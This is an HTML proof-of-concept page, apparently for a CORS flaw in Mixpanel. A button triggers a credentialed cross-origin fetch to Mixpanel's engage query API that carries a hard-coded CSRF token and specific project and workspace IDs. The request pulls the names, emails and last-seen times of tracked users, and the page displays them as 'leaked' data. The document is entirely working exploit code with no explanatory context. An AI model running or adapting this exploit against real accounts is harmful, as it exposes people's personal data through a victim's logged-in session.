<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Mixpanel CORS PoC</title>
</head>
<body>
  <h1>Mixpanel CORS PoC Test</h1>
  <button id="runExploit">Run Exploit</button>

  <script>
    document.getElementById('runExploit').addEventListener('click', async () => {
      try {
        const response = await fetch("https://mixpanel.com/api/query/engage", {
          method: "POST",
          credentials: "include",
          headers: {
            "Content-Type": "application/json",
            "Authorization": "Session",
            "X-Csrftoken": "TbM3l35B2a1g76Q5cFdW95c2Nkd1p8A3"
          },
          body: JSON.stringify({
            filter_by_cohort: {
              raw_cohort: {
                name: "",
                id: null,
                unsavedId: null,
                groups: [
                  {
                    type: "cohort_group",
                    event: {
                      resourceType: "cohort",
                      value: "$all_users",
                      label: "({t:e})=>e(\"signal.cohort-all-users\")"
                    },
                    filters: [
                      {
                        filterValue: {
                          type: "in the last",
                          window: { unit: "day", value: 7 }
                        },
                        resourceType: "user",
                        propertyDefaultType: "datetime",
                        propertyName: "$last_seen",
                        propertyType: "datetime",
                        filterOperator: "in the last",
                        propertyObjectKey: null
                      }
                    ],
                    filtersOperator: "and",
                    behavioralFiltersOperator: "and",
                    groupingOperator: null,
                    property: null
                  }
                ]
              }
            },
            sort_order: "descending",
            sort_column: { value: "$last_seen", resourceType: "user" },
            search: "",
            columns: [
              { value: "$name", resourceType: "user", label: "Name", type: "string", propertyDefaultType: "string" },
              { value: "$email", resourceType: "user", label: "Email", type: "string", propertyDefaultType: "string" },
              { value: "$last_seen", resourceType: "user" }
            ],
            tracking_props: { is_main_query_for_report: true, report_name: "users_sidebar" },
            project_id: "3828765",
            include_all_users: false,
            limit: 6,
            use_query_sampling: true,
            workspace_id: "4324524"
          })
        });

        if (response.ok) {
          const data = await response.json();
          console.log("Leaked Mixpanel data:", data);
          alert(JSON.stringify(data, null, 2));
        } else {
          console.error("Request failed with status", response.status);
        }
      } catch (e) {
        console.error("Fetch error:", e);
      }
    });
  </script>
</body>
</html>
